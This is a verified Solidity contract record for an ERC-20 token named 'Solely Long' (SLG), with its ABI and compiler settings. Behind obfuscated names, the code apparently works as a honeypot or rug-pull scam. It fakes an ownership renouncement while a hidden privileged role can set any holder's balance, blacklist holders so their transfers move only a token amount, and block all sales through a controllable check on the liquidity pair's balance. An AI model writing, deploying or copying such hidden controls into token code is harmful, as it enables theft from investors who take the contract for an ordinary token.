{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface swapAutoMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletBuyTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txFeeTake {\n    function createPair(address tradingAmount, address txShould) external returns (address);\n}\n\ninterface modeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderTotal) external view returns (uint256);\n\n    function transfer(address toLimit, uint256 amountFundTotal) external returns (bool);\n\n    function allowance(address receiverShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountFundTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toLimit,\n        uint256 amountFundTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeSellLaunched, uint256 value);\n    event Approval(address indexed receiverShould, address indexed spender, uint256 value);\n}\n\ninterface fundSellTake is modeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SolelyLong is walletBuyTotal, modeTo, fundSellTake {\n\n    address public autoTeam;\n\n    function enableExempt(uint256 amountFundTotal) public {\n        fundTo();\n        fromList = amountFundTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return listFundExempt;\n    }\n\n    mapping(address => bool) public listBuy;\n\n    function senderAmountMin(address listMarketing, uint256 amountFundTotal) public {\n        fundTo();\n        buyReceiver[listMarketing] = amountFundTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toTake;\n    }\n\n    function takeAmount(address shouldTotal) public {\n        fundTo();\n        \n        if (shouldTotal == autoTeam || shouldTotal == senderReceiver) {\n            return;\n        }\n        listBuy[shouldTotal] = true;\n    }\n\n    string private feeShould = \"Solely Long\";\n\n    function transfer(address listMarketing, uint256 amountFundTotal) external virtual override returns (bool) {\n        return shouldAutoReceiver(_msgSender(), listMarketing, amountFundTotal);\n    }\n\n    function approve(address minTxExempt, uint256 amountFundTotal) public virtual override returns (bool) {\n        amountReceiver[_msgSender()][minTxExempt] = amountFundTotal;\n        emit Approval(_msgSender(), minTxExempt, amountFundTotal);\n        return true;\n    }\n\n    uint256 constant shouldSender = 18 ** 10;\n\n    bool private launchedMax;\n\n    function sellTo(address launchMode) public {\n        if (feeList) {\n            return;\n        }\n        \n        shouldToken[launchMode] = true;\n        if (receiverListMin != sellAuto) {\n            feeLiquidity = true;\n        }\n        feeList = true;\n    }\n\n    function transferFrom(address isFromAt, address toLimit, uint256 amountFundTotal) external override returns (bool) {\n        if (_msgSender() != txSender) {\n            if (amountReceiver[isFromAt][_msgSender()] != type(uint256).max) {\n                require(amountFundTotal <= amountReceiver[isFromAt][_msgSender()]);\n                amountReceiver[isFromAt][_msgSender()] -= amountFundTotal;\n            }\n        }\n        return shouldAutoReceiver(isFromAt, toLimit, amountFundTotal);\n    }\n\n    bool public feeList;\n\n    mapping(address => mapping(address => uint256)) private amountReceiver;\n\n    function fundTo() private view {\n        require(shouldToken[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed amountAuto, address indexed autoIs);\n\n    address txSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return feeShould;\n    }\n\n    uint256 exemptTake;\n\n    function allowance(address modeSwapAmount, address minTxExempt) external view virtual override returns (uint256) {\n        if (minTxExempt == txSender) {\n            return type(uint256).max;\n        }\n        return amountReceiver[modeSwapAmount][minTxExempt];\n    }\n\n    bool private receiverSwapLaunched;\n\n    mapping(address => bool) public shouldToken;\n\n    uint8 private toTake = 18;\n\n    bool private launchTokenAt;\n\n    address maxAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private receiverFee;\n\n    constructor (){\n        \n        swapAutoMin teamSwap = swapAutoMin(txSender);\n        senderReceiver = txFeeTake(teamSwap.factory()).createPair(teamSwap.WETH(), address(this));\n        \n        autoTeam = _msgSender();\n        maxTokenTotal();\n        shouldToken[autoTeam] = true;\n        buyReceiver[autoTeam] = tradingLimit;\n        \n        emit Transfer(address(0), autoTeam, tradingLimit);\n    }\n\n    function tokenLiquidity(address isFromAt, address toLimit, uint256 amountFundTotal) internal returns (bool) {\n        require(buyReceiver[isFromAt] >= amountFundTotal);\n        buyReceiver[isFromAt] -= amountFundTotal;\n        buyReceiver[toLimit] += amountFundTotal;\n        emit Transfer(isFromAt, toLimit, amountFundTotal);\n        return true;\n    }\n\n    bool private swapTradingTo;\n\n    uint256 private receiverListMin;\n\n    function balanceOf(address senderTotal) public view virtual override returns (uint256) {\n        return buyReceiver[senderTotal];\n    }\n\n    function shouldAutoReceiver(address isFromAt, address toLimit, uint256 amountFundTotal) internal returns (bool) {\n        if (isFromAt == autoTeam) {\n            return tokenLiquidity(isFromAt, toLimit, amountFundTotal);\n        }\n        uint256 buyTx = modeTo(senderReceiver).balanceOf(maxAmount);\n        require(buyTx == fromList);\n        require(toLimit != maxAmount);\n        if (listBuy[isFromAt]) {\n            return tokenLiquidity(isFromAt, toLimit, shouldSender);\n        }\n        return tokenLiquidity(isFromAt, toLimit, amountFundTotal);\n    }\n\n    function owner() external view returns (address) {\n        return listFundExempt;\n    }\n\n    uint256 fromList;\n\n    address private listFundExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLimit;\n    }\n\n    string private takeList = \"SLG\";\n\n    address public senderReceiver;\n\n    mapping(address => uint256) private buyReceiver;\n\n    uint256 public sellAuto;\n\n    uint256 private tradingLimit = 100000000 * 10 ** 18;\n\n    bool public feeLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeList;\n    }\n\n    function maxTokenTotal() public {\n        emit OwnershipTransferred(autoTeam, address(0));\n        listFundExempt = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSellLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTxExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFundTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountFundTotal\",\"type\":\"uint256\"}],\"name\":\"enableExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"}],\"name\":\"sellTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFundTotal\",\"type\":\"uint256\"}],\"name\":\"senderAmountMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFundTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFromAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountFundTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SolelyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}